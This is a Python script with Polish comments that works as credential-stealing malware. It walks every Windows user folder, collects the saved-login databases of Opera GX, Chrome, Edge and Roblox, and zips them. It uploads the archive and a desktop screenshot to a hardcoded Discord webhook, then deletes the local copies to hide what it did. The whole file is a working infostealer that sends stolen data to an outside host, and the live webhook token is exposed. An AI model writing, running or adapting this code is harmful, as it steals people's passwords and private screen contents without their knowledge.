import os
import zipfile
import requests
import sys
import pyautogui  # Dodane importowanie pyautogui

# URL webhooków (możesz dostosować je w zależności od użytkownika)
webhook_url_1 = "https://discord.com/api/webhooks/1322292531374854224/Fdl-C9RgDUxDtK2bFQXPpRx5G_jGHjy2cNJ-k7_4O4kUAIfJaIZLOTz2JUSLon5QBOGe"
webhook_url_2 = "https://discord.com/api/webhooks/1322292531374854224/Fdl-C9RgDUxDtK2bFQXPpRx5G_jGHjy2cNJ-k7_4O4kUAIfJaIZLOTz2JUSLon5QBOGe"

# Ścieżka do katalogu z użytkownikami
users_directory = r"C:\Users"

# Funkcja do sprawdzania uprawnień
if not os.access(users_directory, os.W_OK):
    print("Brak wymaganych uprawnień. Uruchom skrypt jako administrator.")
    sys.exit(1)

# Funkcja do wysyłania pliku na Discord
def send_file_to_discord(file_path, webhook_url):
    try:
        with open(file_path, "rb") as file:
            response = requests.post(
                webhook_url,
                files={"file": file},
                data={"content": f"Plik wysłany z {file_path}!"}
            )
        if response.status_code == 200:
            print(f"Plik {file_path} wysłany na Discord.")
        else:
            print(f"Błąd przy wysyłaniu {file_path}: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Błąd przy otwieraniu pliku {file_path}: {e}")

# Lista folderów aplikacji
login_data_paths = {
    "Opera GX": r"AppData\Roaming\Opera Software\Opera GX Stable\Login Data",
    "Google Chrome": r"AppData\Local\Google\Chrome\User Data\Default\Login Data",
    "Microsoft Edge": r"AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
    "Roblox": r"AppData\Local\Roblox\user_data\Login Data"
}

# Funkcja do tworzenia pliku ZIP
def create_zip_from_files(file_paths, zip_file_name):
    with zipfile.ZipFile(zip_file_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in file_paths:
            zipf.write(file, os.path.basename(file))
    print(f"Pliki spakowane do {zip_file_name}")

# Funkcja do robienia zrzutu ekranu
def take_screenshot(save_path):
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(save_path)
        print(f"Zrzut ekranu zapisany w {save_path}")
        return save_path
    except Exception as e:
        print(f"Błąd przy robieniu zrzutu ekranu: {e}")
        return None

# Funkcja do przeszukiwania folderów użytkowników i zbierania plików Login Data
def search_for_login_data():
    files_to_zip = []
    
    for username in os.listdir(users_directory):
        user_folder = os.path.join(users_directory, username)
        
        # Sprawdzamy, czy folder to rzeczywisty folder użytkownika
        if os.path.isdir(user_folder) and username not in ["Default", "Default User", "All Users", "Public"]:
            print(f"Przeszukiwanie folderu: {username}")
            
            # Iterowanie przez aplikacje
            for app_name, relative_path in login_data_paths.items():
                login_data_path = os.path.join(user_folder, relative_path)
                
                # Sprawdzamy, czy plik istnieje
                if os.path.exists(login_data_path):
                    print(f"Znaleziono plik Login Data w {app_name} dla użytkownika {username}: {login_data_path}")
                    
                    # Dodanie pliku do listy do spakowania
                    files_to_zip.append(login_data_path)
                else:
                    print(f"Plik Login Data nie został znaleziony w {app_name} dla użytkownika {username}.")
        else:
            print(f"Folder {username} nie jest użytkownikiem (może to folder systemowy).")
    
    # Tworzenie ZIP z plikami
    if files_to_zip:
        zip_file_name = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'Login_Data_Archive.zip')
        create_zip_from_files(files_to_zip, zip_file_name)
        
        # Wysyłanie ZIP-a na Discord
        if len(files_to_zip) > 0:
            send_file_to_discord(zip_file_name, webhook_url_1)
            
            # Usuwanie pliku ZIP po wysłaniu
            os.remove(zip_file_name)
            print(f"Plik {zip_file_name} został usunięty po wysłaniu.")
        else:
            print("Brak plików do spakowania i wysłania.")

# Funkcja do robienia zrzutu ekranu na pulpit i wysyłania go na Discord
def send_screenshot_to_discord():
    # Ścieżka do zapisu na pulpicie użytkownika
    screenshot_path = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'screenshot.png')
    
    # Robienie zrzutu ekranu
    screenshot_file = take_screenshot(screenshot_path)
    
    if screenshot_file:
        # Wysyłanie zrzutu ekranu na Discord
        send_file_to_discord(screenshot_file, webhook_url_1)
        
        # Usuwanie zrzutu ekranu po wysłaniu
        try:
            os.remove(screenshot_path)
            print(f"Zrzut ekranu wysłany na Discord i usunięty z dysku.")
        except Exception as e:
            print(f"Błąd przy usuwaniu zrzutu ekranu: {e}")
    else:
        print("Błąd przy robieniu zrzutu ekranu.")

# Uruchomienie przeszukiwania
search_for_login_data()

# Uruchomienie robienia zrzutu ekranu i wysyłania go na Discord
send_screenshot_to_discord()
